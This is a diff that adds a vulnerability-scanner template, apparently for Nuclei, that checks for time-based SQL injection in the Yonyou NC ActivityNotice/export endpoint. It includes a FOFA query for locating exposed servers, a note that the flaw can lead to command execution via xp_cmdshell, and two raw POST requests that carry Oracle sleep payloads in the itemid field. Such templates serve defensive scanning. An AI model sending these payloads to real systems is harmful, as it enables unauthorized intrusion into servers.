@@ -1,0 +1,35 @@
+id: yongyouNC-ActivityNotice-export-sql-time
+
+info:
+  name: 用友NC ActivityNotice/export SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友NC ActivityNotice/export 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://mp.weixin.qq.com/s/7mLS0v1K5RWWtnjXh8U3Zg
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        itemid=1' AND 1=dbms_pipe.receive_message('RDS', 4)--
+      - |
+        POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        itemid=1' AND 1=dbms_pipe.receive_message('RDS', 8)--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
